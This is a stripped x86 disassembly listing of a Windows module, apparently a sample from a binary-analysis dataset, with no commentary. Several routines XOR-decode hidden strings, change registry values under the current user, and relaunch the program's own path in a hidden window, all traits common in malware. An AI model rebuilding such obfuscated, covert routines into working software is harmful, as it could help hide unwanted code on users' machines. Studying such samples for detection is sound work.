mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
add edi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x48 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp cx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x60 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jns r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x58 ] 0x2
add eax 0x2
dec [ ebp - 0x48 ]
cmp [ ebp - 0x48 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x54 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x58 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
add esi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x70 ] 0x2
sub [ ebp - 0x6c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x70 ]
movzx ecx [ eax ]
mov eax [ ebp - 0x6c ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x58 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_1003ace0
push ebp
mov ebp esp
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ r--data ]
push esi
xor eax eax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0x22
and esi 0xff
mov [ ebp + eax * 2 - 0xa8 ] si
inc eax
cmp eax 0x24
jb r-xdata
mov edx [ r--data ]
xor eax eax
mov [ ebp - 0x60 ] ax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0xffc1
and esi 0xff
mov [ ebp + eax * 2 - 0x58 ] si
inc eax
cmp eax 0x24
jb r-xdata
xor edx edx
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] dx
push eax
lea edx [ ebp - 0xa8 ]
call sub_10042070
mov ecx [ ebp - 0x4 ]
add esp 0x4
neg eax
sbb eax eax
xor ecx ebp
neg eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1003ad80
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_1003c66c
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003adb0
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
sub eax 0x0
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x77
sub eax 0x2
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x20 ]
mov [ esi ] eax
mov eax [ ecx + 0x24 ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x76
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10024145
mov esp ebp
pop ebp
retn
call sub_100050e0
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_1003ae30
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
pop esi
retn
push eax
call sub_1006591f
add esp 0x4
sub_1003ae80
push ebp
mov ebp esp
push 0xffffffff
push sub_10081ca6
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx ebx
call sub_10036940
test eax eax
je r-xdata
mov ecx ebx
call sub_10059df0
test eax eax
jne r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_10039b60
test eax eax
je r-xdata
mov eax 0x7
jmp r-xdata
mov ecx ebx
call sub_1004b100
test eax eax
je r-xdata
xor edi edi
mov [ ebp - 0x98 ] 0xf
mov [ ebp - 0x9c ] edi
mov [ ebp - 0xac ] 0x0
lea edx [ ebp - 0x80 ]
mov eax 0xae
mov [ ebp - 0x4 ] edi
call sub_100050e0
push edi
push 0x1
push edi
push edi
lea eax [ ebp - 0xcc ]
push eax
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push 0xffffffff
push edi
push rw-data
lea ecx [ ebx + 0x40 ]
call sub_10019180
mov ecx ebx
call sub_1002af70
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx ebx
call sub_1001c0f0
mov ecx ebx
call sub_1003da40
mov ecx ebx
call sub_1000be80
test eax eax
je r-xdata
mov eax 0x8
jmp r-xdata
mov eax [ ebp - 0xcc ]
lea edx [ ebp - 0x18 ]
push edx
push 0x6
push eax
call [ CryptGenRandom@IAT ]
push edi
test eax eax
jne r-xdata
cmp [ ebp - 0x98 ] 0x10
jb r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0xa9
call sub_100050e0
lea eax [ edi + 0x5 ]
jmp r-xdata
mov ecx ebx
call sub_100037e0
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0x27
call sub_100050e0
mov eax 0x6
jmp r-xdata
mov edx [ ebp - 0xcc ]
push edx
call [ CryptReleaseContext@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xcc ]
push ecx
call [ CryptReleaseContext@IAT ]
lea ecx [ ebp - 0xac ]
call sub_10061060
mov eax 0x2
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0xac ]
push ecx
call sub_1006591f
add esp 0x4
mov ecx ebx
call sub_10059a50
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0x5f
call sub_100050e0
push 0x6
lea ecx [ ebp - 0x18 ]
lea esi [ ebp - 0xc8 ]
call sub_10041110
add esp 0x4
push eax
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x1
call sub_1000adb0
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10061060
cmp [ ebp - 0x98 ] 0x10
mov eax [ ebp - 0xac ]
jae r-xdata
lea ecx [ ebp - 0xac ]
call sub_10061060
mov eax 0x3
jmp r-xdata
call sub_10055390
mov esi eax
test esi esi
jne r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x43
call sub_100050e0
push 0x9
lea ecx [ ebp - 0x2c ]
push ecx
push 0xffffffff
push eax
push 0x1
push edi
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xac ]
push 0x0
lea edx [ ebx + 0x138 ]
push ebx
mov ecx esi
call sub_1000a300
test eax eax
je r-xdata
lea eax [ esi + 0x9 ]
jmp r-xdata
lea edx [ ebx + 0x40 ]
push edx
lea edx [ ebp - 0x2c ]
call sub_1005eea0
mov ecx ebx
call sub_1002af70
test eax eax
je r-xdata
lea ecx [ ebp - 0xac ]
call sub_10061060
mov eax 0x4
jmp r-xdata
push esi
call [ LocalFree@IAT ]
push ebx
call sub_100197b0
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0x5d
call sub_100050e0
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10061060
lea edx [ ebp - 0x80 ]
mov eax 0xa9
call sub_100050e0
lea ecx [ ebp - 0xac ]
call sub_10061060
mov eax 0x5
jmp r-xdata
push ebx
call sub_1000bd70
test eax eax
je r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0x1e
call sub_100050e0
mov eax 0xb
jmp r-xdata
mov ecx ebx
call sub_10030280
test eax eax
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x21
call sub_100050e0
mov eax 0xc
jmp r-xdata
xor eax eax
lea edx [ ebp - 0x90 ]
mov eax 0xbf
call sub_100050e0
mov eax 0xd
jmp r-xdata
sub_1003b1ca
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
and [ eax ] 0x0
push edi
test esi esi
jne r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
call sub_1001d849
mov eax esi
jmp r-xdata
push 0x4
push [ ebp + 0x8 ]
call esi
test eax eax
jne r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
pop esi
leave
retn
xor eax eax
call sub_1004fd6f
mov [ eax ] 0xc
call sub_1004fd6f
mov eax [ eax ]
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
call sub_1001d849
mov eax esi
jmp r-xdata
pop edi
push ebx
push esi
call [ EncodePointer@IAT ]
mov edi eax
call sub_10029ea7
push edi
push rw-data
mov ebx eax
call [ InterlockedExchange@IAT ]
cmp eax ebx
pop ebx
je r-xdata
call sub_1004fd6f
mov esi [ GetLastError@IAT ]
mov edi eax
call esi
push eax
call sub_100027ad
pop ecx
mov [ edi ] eax
call sub_1001d849
call esi
push eax
call sub_100027ad
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
sub_1003b2c0
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
retn
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp edx [ ecx ]
jne r-xdata
mov [ eax ] edx
retn
nop
retn
mov [ eax ] ecx
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_1003b313
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_10022b5a
pop ecx
sub_1003b340
push ebp
mov ebp esp
push 0xffffffff
push sub_10080e50
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
push 0x10
mov [ ebp - 0x4 ] edi
call sub_10055606
add esp 0x4
cmp eax edi
je r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_1003b400
push ebp
mov ebp esp
sub esp 0xa4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe8
and edx 0xff
mov [ ebp + eax * 2 - 0x54 ] dx
inc eax
cmp eax 0x27
jb r-xdata
push esi
mov esi [ GetFileAttributesW@IAT ]
lea ecx [ ebp - 0x54 ]
xor eax eax
push ecx
mov [ ebp - 0x6 ] ax
call esi
cmp eax 0xffffffff
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xc
call sub_100429d0
push edx
call esi
xor ecx ecx
cmp eax 0xffffffff
setne cl
pop esi
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1003b4a0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
push ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push edx
mov ecx esi
mov [ esi ] ax
call sub_100531b0
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003b4cf
push 0x3c
mov eax sub_1007f914
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10030ef2
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1006b2d6
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10069ce0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_1003b590
push ebp
mov ebp esp
sub esp 0x31c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x60
and edx 0xff
mov [ ebp + eax * 2 - 0xb8 ] dx
inc eax
cmp eax 0x29
jb r-xdata
push esi
mov esi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0x318 ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0xb8 ]
push edx
push 0x80000001
mov [ ebp - 0x66 ] ax
call esi
test eax eax
je r-xdata
xor eax eax
movzx edx ax
mov eax edx
push edi
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x314 ]
[ edi ]
lea edx [ ebp - 0x3c ]
mov eax 0xdd
mov [ ebp - 0x31c ] 0x206
call sub_10013830
lea eax [ ebp - 0x31c ]
push eax
mov eax [ ebp - 0x318 ]
lea ecx [ ebp - 0x314 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x318 ]
mov edi [ RegCloseKey@IAT ]
push ecx
call edi
lea edx [ ebp - 0x10c ]
mov eax 0x93
call sub_10013830
lea edx [ ebp - 0x318 ]
push edx
push 0x2
push 0x0
lea eax [ ebp - 0x10c ]
push eax
push 0x80000001
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x14f
call sub_10013830
mov ecx edx
push ecx
lea edx [ ebp - 0x314 ]
push edx
call [ StrCmpW@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0xf1
call sub_10013830
lea edx [ ebp - 0xc ]
mov eax 0x105
call sub_10013830
mov eax [ ebp - 0x318 ]
push 0x6
mov ecx edx
push ecx
push 0x1
push 0x0
lea edx [ ebp - 0x64 ]
push edx
push eax
call [ RegSetValueExW@IAT ]
test eax eax
je r-xdata
pop edi
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x318 ]
push eax
call [ RegCloseKey@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x318 ]
push edx
call edi
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x318 ]
push ecx
call edi
pop edi
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1003b770
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
cmp [ eax + 0x1 ] 0x2f
push edi
lea edi [ eax + 0x1 ]
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
mov eax [ esi + 0x4 ]
add eax edi
mov [ esi ] edi
cmp edi eax
je r-xdata
add eax 0x2
add [ esi + 0x4 ] 0xfffffffd
pop edi
mov [ esi ] eax
pop esi
pop ebp
retn
pop edi
movsx eax [ edi ]
push eax
call sub_100213ec
add esp 0x4
test eax eax
jne r-xdata
sub edi [ esi ]
mov [ esi + 0x4 ] edi
cmp [ edi ] 0x2f
je r-xdata
mov ecx [ esi ]
add ecx [ esi + 0x4 ]
inc edi
cmp edi ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_1003b7cf
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_10004056
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_1003b810
push ebp
mov ebp esp
sub esp 0xa8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ GetModuleFileNameW@IAT ]
push 0x104
lea eax [ ebp - 0x828 ]
push eax
push 0x0
call esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ rw-data ]
push 0x104
lea ecx [ ebp - 0xa30 ]
push ecx
push edx
call esi
test eax eax
je r-xdata
push r--data
mov edx 0x7ffffffe
mov eax 0x30c
lea ecx [ ebp - 0x620 ]
call sub_1006c8f0
test eax eax
js r-xdata
lea eax [ ebp - 0x828 ]
push eax
lea esi [ ebp - 0x620 ]
call sub_100658c0
test eax eax
js r-xdata
push r--data
call sub_100658c0
test eax eax
js r-xdata
lea ecx [ ebp - 0xa30 ]
push ecx
call sub_100658c0
test eax eax
js r-xdata
push r--data
call sub_100658c0
test eax eax
js r-xdata
push rw-data
call sub_100658c0
test eax eax
js r-xdata
xor eax eax
push 0x44
push eax
lea edx [ ebp - 0xa88 ]
push edx
mov [ ebp - 0xa40 ] eax
mov [ ebp - 0xa3c ] eax
mov [ ebp - 0xa38 ] eax
mov [ ebp - 0xa34 ] eax
call sub_10079a10
add esp 0xc
lea eax [ ebp - 0xa40 ]
push eax
lea ecx [ ebp - 0xa88 ]
push ecx
push 0x0
push 0x0
push 0x8000000
push 0x0
push 0x0
push 0x0
mov edx esi
push edx
push 0x0
mov [ ebp - 0xa88 ] 0x44
call [ CreateProcessW@IAT ]
sub_1003b946
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_1002bd31
pop ecx
push eax
push [ ebp + 0x8 ]
mov ecx esi
call sub_10040ded
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003b980
push ebp
mov ebp esp
sub esp 0x26c
mov eax [ rw-data ]
xor eax ebp
